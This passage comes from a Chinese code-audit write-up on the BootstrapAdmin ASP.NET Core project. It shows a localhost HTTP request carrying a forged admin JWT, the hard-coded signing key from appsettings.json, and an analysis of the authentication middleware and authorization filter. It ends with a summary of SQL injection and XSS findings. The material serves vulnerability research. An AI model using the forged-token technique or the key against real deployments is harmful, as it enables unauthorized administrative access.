Host: localhost:50852
Content-Length: 5
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/json
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36
sec-ch-ua-platform: "Windows"
Origin: http://localhost:50852
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost:50852/Admin/Users
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1bmlxdWVfbmFtZSI6IkFkbWluIiwibmJmIjoxNjgzMzgzNTA1LCJleHAiOjE2OTMzODM1MDUsImlhdCI6MTY4MzM4MzUwNSwiaXNzIjoiQkEiLCJhdWQiOiJhcGkifQ.DvpSS-mW4nmKaTf-NFMQHgWO2XhAP5SFX-7Ec2uV3nQ
Cookie: 
Connection: close

["1"]
```

这个时候我们使用账号`superadmin/123456`登录就是管理员用户了。

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-e2e5f96c69503d741d9985054f9353b1ed8b3af5.png)

### 漏洞定位

`BootstrapAdmin\src\mvc\admin\Bootstrap.Admin\Startup.cs`  
在这个文件里添加了一个`UseBootstrapAdminAuthentication`的中间件，我们所有的请求会先进入到该中间件。

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-0909118716cf45f8b436cc7713f80f8f98a9ffba.png)

反编译`bootstrap.security.mvc\6.0.0\lib\net5.0\Bootstrap.Security.Mvc.dll`  
跟进`AuthenticationExtensions`类，可以看到`UseBootstrapAdminAuthentication`方法

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-00e4fdb705e18ddc793c8825d04c724cfa83d546.png)

> 首先`builder.UseAuthentication();`启用身份验证中间件。在 ASP.NET Core 应用程序中，身份验证中间件处理身份验证和票据。它负责验证请求中的凭据并设置当前用户的身份。启用身份验证后，可以使用 HttpContext.User 属性访问当前用户的身份信息。通常会在 Configure 方法中调用 UseAuthentication()，以确保在请求管道中使用身份验证中间件。  
> 其次`builder.Use`和`builder.UseWhen`都是 ASP.NET Core 应用程序中用于修改请求管道的方法，但是它们的使用场景有所不同。  
> builder.Use 用于向请求管道中添加中间件。它可以将多个中间件串连在一起，按照添加的顺序一个接一个地处理请求，从而实现请求处理流程的定制。例如，在调用控制器方法之前可以添加一个身份验证中间件，以确保只有已经通过身份验证的用户才能访问受保护的资源。builder.Use 返回一个 IApplicationBuilder 实例，因此可以在一个 Configure 方法中多次调用 builder.Use，以添加所需的中间件。  
> builder.UseWhen 则用于根据一定的条件向请求管道中添加中间件。它接受一个布尔表达式作为参数，只有当表达式的结果为 true 时才会添加中间件。这个功能在某些场景下很有用，例如，可以根据请求的路径来决定是否启用某个特定的中间件。builder.UseWhen 返回一个 IApplicationBuilder 实例，也可以嵌套在另一个 builder.UseWhen 中，以实现复杂的条件分支逻辑。

我们先查看特殊情况，也就是`builder.UseWhen`。这里的条件是请求路径中包含`/api`时会应用下面的中间件。

```python
app.Use(async delegate (HttpContext context, Func<Task> next)
{
    IIdentity? identity = context.User.Identity;
    if (identity != null && !identity!.IsAuthenticated)
    {
        JwtAuthentication(context);
    }

    if ((context.User.Identity?.IsAuthenticated ?? false) && !string.IsNullOrEmpty(context.User.Identity!.Name))
    {
        AddRoles(context.User, RetrieveRolesByUserName(context.User.Identity!.Name), new ClaimsIdentity("Bearer"));
    }

    await next();
});
```

当`identity`不存在时，即 Cookie 中的`.AspNetCore.Cookies`不存在时使用`JwtAuthentication`，我们继续跟进该方法。  
`JwtAuthentication`在`AuthenticationExtensions`类。观察`ValidateToken`，这是JWT的验证方法，校验了三个参数，分别是签名密钥以及令牌的颁发者 Issuer 和 Audience。如果验证成功，则返回`ClaimsPrincipal`对象表示令牌中包含的声明。

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-194d8a620f2290f1169cf2043d40b9212f6fd13e.png)

需要校验的内容都在：  
`BootstrapAdmin\src\mvc\admin\Bootstrap.Admin\appsettings.json`

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-1d10072cd0f30445a6378b44aa5d8f093ad780b6.png)

```python
  "TokenValidateOption": {
    "Issuer": "BA",
    "Audience": "api",
    "Expires": 5,
    "SecurityKey": "BootstrapAdmin-V1.1"
  }
```

我们得到了这些参数就可以进行JWT伪造了。  
那么我们经过了`JwtAuthentication`此时`context.User`已经是`claimsPrincipal`对象了。第二个判断判断了用户是否已经认证（authenticated）以及用户的身份是否存在（name是否为空）。然后进入到`AddRoles`方法中去。

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-6bedfb63e206681b829c8cea573f5ddbb530f6e0.png)

> ClaimsPrincipal 对象是 ASP.NET Core Identity 框架中用于表示用户上下文认证信息的对象。它包含了一个或多个 Claim，每个 Claim 包含了一些有关用户身份、角色或标识的信息。

这里添加了`role`以便后续的身份校验。其中的`roles`的值为  
`RetrieveRolesByUserName(context.User.Identity!.Name)`  
通过用户名查询对于的角色列表，然后通过遍历添加`Claim`。  
那么什么时候会用到`role`呢？我们接着往下看。  
`BootstrapAdmin\src\mvc\admin\Bootstrap.Admin\Startup.cs`  
在这个文件里给 Controllers 添加了BootstrapAdmin 后台权限认证过滤器

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-fb6c0f4832237396fc90873719169c2cc6738e89.png)

反编译`bootstrap.security.mvc\6.0.0\lib\net5.0\Bootstrap.Security.Mvc.dll`  
跟进 `BootstrapAdminAuthorizeFilter`类可以看到`OnAuthorizationAsync`，这方个法适用于控制器和 Razor 页面等需要进行授权检查的请求。

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-95cdd105580e6a8333090ea1d4688f2bb450813a.png)

> context.Request.Path 是一个属性，它返回一个 PathString 对象，代表请求 URL 的路径部分。PathString 对象是一个不可变类型，用于存储 URL 路径。PathString 的值形式如下所示：  
> `/Controller/Action/ID`  
> 其中，/Controller 是控制器的名称，/Action 是控制器的方法名，/ID 是可选的参数，用于标识要处理的特定资源。在 ASP.NET Core 应用程序中，PathString 对象用于匹配路由模板，以确定要执行哪个控制器方法。可以使用 context.Request.Path.ToString() 方法获取 PathString 对象的字符串表示形式，以便在日志或调试信息中使用。

这里做了两个判断：

1. 查询判断了当前请求是否需要进行授权检查。如果当前请求标记为允许匿名访问，或者是一个 Razor 页面并且该页面已配置为匿名，或者当前用户拥有 Administrators 角色，则该请求无需进行授权检查，并允许请求通过。
2. 通过调用 AuthenticationExtensions.RetrieveRolesByUrl 方法获取当前 URL 具有的角色集合，判断当前用户的角色是否是集合中的一个。

通过后即可访问控制器方法。

0x05 后语
=======

在本篇文章中可以看到，我们注重了文件IO操作、SQL ORM操作、权限校验、XSS漏洞。

测试SQL注入时，ORM使用了PetaPoco并且运用了Linq对用户输入的内容进行转义，尽管使用`@0`方式很安全，但在`Order By`处不能转义。这是老生常谈了。开发人员没有针对性的过滤导致漏洞的产生。

测试XSS时，开发者使用了Razor Pages，在 Razor 视图中，默认情况下会进行 HTML 实体编码。可尽管严防死守，还是避免不了使用`@Url.Content`，没有针对`javascript:`这样的请求路径进行过滤。除此之外，还有在页面中使用`html(text)`函数输出的情况，只不过我测试时发现大部分无法有效利用，并且使用了`$.safeHtml()`函数所以仅列出了一个前台反射型XSS。

测试权限校验时显示观察了带有`[AllowAnonymous]`标签的类和方法，后面才是根据`Startup.cs`查看了过滤器和中间件，并根据开发者提供的 [Bootstrap.Security.Mvc](https://gitee.com/LongbowEnterprise/BootstrapAdmin/wikis/%E9%A1%B9%E7%9B%AE%E4%BE%9D%E8%B5%96/Bootstrap.Security.Mvc) 进行了审计。

总而言之，无论是使用什么语言开发都要按照标准进行，我们代码审计时更加需要细心和多一些耐心。